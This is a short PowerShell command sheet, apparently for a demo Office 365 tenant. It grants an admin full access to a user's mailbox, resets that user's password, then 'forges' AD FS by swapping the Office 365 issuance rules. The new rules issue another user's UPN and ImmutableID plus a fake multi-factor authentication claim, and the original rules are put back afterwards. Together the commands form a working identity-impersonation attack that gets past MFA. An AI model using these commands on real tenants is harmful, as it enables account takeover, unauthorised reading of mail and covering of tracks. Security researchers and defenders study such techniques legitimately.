## GIVE MAILBOX PERMISSION
# Add full access rights to user's mailbox
Add-MailboxPermission -Identity LeeG -user admin -AccessRights FullAccess -InheritanceType all

# Remove access
Remove-MailboxPermission -Identity LeeG -user admin -AccessRights FullAccess

# Enable audit log
Get-mailbox | Set-Mailbox -AuditEnabled $true

## Reset password
# Reset user's password
Set-MsolUserPassword -UserPrincipalName LeeG@seattle.o365life.com -ForceChangePassword $false

# Check password change timestamp
Get-MsolUser -UserPrincipalName LeeG@seattle.o365life.com | fl *last*

# Check the last password sync time
Get-MsolCompanyInformation | fl *pass*

## Forge AD FS
# Backup the current rules
Get-AdfsRelyingPartyTrust -Name "Microsoft Office 365 Identity Platform" | Select -ExpandProperty IssuanceTransformRules | Out-File $HOME\oldrules.txt

# Get user's GUID and UPN
Get-ADUser LeeG | Select UserPrincipalName,ObjectGUID

# Base64 encode the GUID
[System.Convert]::ToBase64String((Get-ADUser LeeG).ObjectGUID.toByteArray())

# Create new issuance rules
notepad $HOME\newrules.txt

# Add following lines (remove # marks)
#=> issue(Type = "http://schemas.xmlsoap.org/claims/UPN", Value="DebraB@sso.o365life.com");
#=> issue(Type = "http://schemas.microsoft.com/LiveID/Federation/2008/05/ImmutableID", Value="Lz3wkUf9E+eAC6lEXeqIQ==");
#=> issue(Type = "http://schemas.microsoft.com/claims/authnmethodsreferences", Value ="http://schemas.microsoft.com/claims/multipleauthn");

# Apply new issuance rules
Set-AdfsRelyingPartyTrust -TargetName "Microsoft Office 365 Identity Platform" -IssuanceTransformRulesFile $HOME\newrules.txt

# Return the original rules
Set-AdfsRelyingPartyTrust -TargetName "Microsoft Office 365 Identity Platform" -IssuanceTransformRulesFile $HOME\oldrules.txt
